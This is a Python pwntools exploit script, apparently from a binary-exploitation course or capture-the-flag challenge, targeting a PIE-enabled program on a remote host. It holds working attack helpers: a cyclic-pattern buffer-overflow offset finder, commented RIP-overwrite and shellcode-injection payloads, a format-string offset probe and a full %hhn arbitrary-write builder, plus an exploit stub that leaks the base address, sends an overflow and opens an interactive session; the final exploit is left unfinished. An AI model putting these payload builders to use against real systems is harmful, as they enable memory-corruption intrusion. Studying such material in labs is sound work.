#!/usr/bin/env python3

# Arch:       amd64-64-little
# RELRO:      No RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled <<< NEED TO BEAT ASLR
# Stripped:   No

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 1234

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

        E = ELF(f"{__file__.replace('_sol.py', '')}")

########################################
### Buffer Overflow Helper Functions ###
########################################

def find_offset_from_rdp(after=b'?\n', cyclic_length=500, max_attempts=20):
    assert cyclic_length > 4, "Cyclic length must be greater than 4."
    
    with context.local(log_level='error'):
        for attempt in range(1, max_attempts + 1):
            connect_binary()

            cyclic_pattern = cyclic(cyclic_length)
            P.sendlineafter(after, cyclic_pattern)
            
            try:
                #################################################
                # MODIFY SECTION TO IDENTIFY LEAKED CRASH VALUE #
                #################################################

                P.recvuntil('jump to ')
                leak = P.recvline().strip()
                crash_value = int(leak, 16)
                
                #################################################

                offset = cyclic_find(crash_value)
                if offset != -1:
                    P.close()
                    return offset

            except EOFError:
                P.close()
                continue

            P.close()

    return None

### Once an offset is found...

# Overwrite RIP

    # crash_value = 0x6177616161766161
    # win_address = E.symbols['win']

    # offset = cyclic_find(crash_value)
    # payload = b"A" * offset
    # payload += p64(win_address)

# SHELLCODE INJECTION
    # payload = fit({(offset_from_rbp - len(shellcode)): shellcode, (offset_from_rbp + 8): p64(address)}, filler='\x90', length=(offset_from_rbp + 16))

######################################
### Format String Helper Functions ###
######################################

def find_offset(after = b':', option = 1):
    for i in range(1, 20):
        connect_binary()

        if option == 1:
            P.sendlineafter(after, f'AAAA%{i}$x'.encode())
            output = P.recvline(timeout=0.5).strip().decode('utf-8')
        else:
            P.sendlineafter(after, 'AAAABBBB %{}$x'.format(i)) # replace %x with %s to find the actual values
            P.recvuntil('AAAABBBB ')
            print('{}: {}'.format(i, P.recvline(timeout=0.5).strip().decode('utf-8')))

        with context.local(log_level='error'):
            P.close()

        if option == 1 and '41414141' in output:
            return i

'''
Format String Builder
---------------------
Accepts target and goal address fields in either int values or p64 - little endian - address formats.
'''
def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
    assert max_size % 8 == 0, "Max size must be 8-byte aligned."

    if isinstance(target, int):
        target = p64(target)
    if isinstance(goal, int):
        goal = p64(goal)

    while True:
        payload = b''
        written = 0

        for i in range(0, bytes_to_write):
            byte_to_write = goal[i]

            to_write = (byte_to_write - written) % 0x100
            written = (written + to_write) % 0x100

            if to_write > 0:
                payload += f"%{to_write}c%{offset + (max_size // 8) + i}$hhn".encode()
            else:
                payload += f"%{offset + (max_size // 8) + i}$hhn".encode()

        payload_len = len(payload)

        if payload_len > max_size:
            max_size = ((payload_len + 7) // 8) * 8
            log.info(f"Increasing format string initial input size to {max_size}")
            continue

        payload = payload.ljust(max_size, b'A')

        for i in range(0, bytes_to_write):
            payload += p64(u64(target) + i)

        return payload
    
######################################
############## Exploit ###############
######################################

def runner(send):
    P.recvuntil(b'refresh): ', drop=True)
    if(send in ['C', 'U', 'P', 'Q']):
        P.sendline(send.encode())

def new_trivial(payload):
    runner('C')
    P.recvuntil(b'name?\n', drop=True)
    P.sendline(payload)

def update_trivial(payload):
    runner('U')
    P.recvuntil(b'yes/no\n', drop=True)
    P.sendline(b'yes')
    P.sendline(payload)

def say(length, payload):
    runner('i')
    P.recvuntil(b'len: ', drop=True)
    P.sendline(length)
    P.sendline(payload)

def exploit():
    P.recvuntil(b'Address is ')
    log.info(f"Before Win Address: {hex(E.symbols['win'])}")
    leak = int(P.recvline()[:-4], 16)
    E.address = leak - E.symbols['user_name']
    log.info(f"After Win Address: {hex(E.symbols['win'])}")

    payload = b'AAAAAAAAAAAAAAAAAAAA'
    new_trivial(payload)
    payload = cyclic(511)
    update_trivial(payload)

    ### Write exploit here...
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
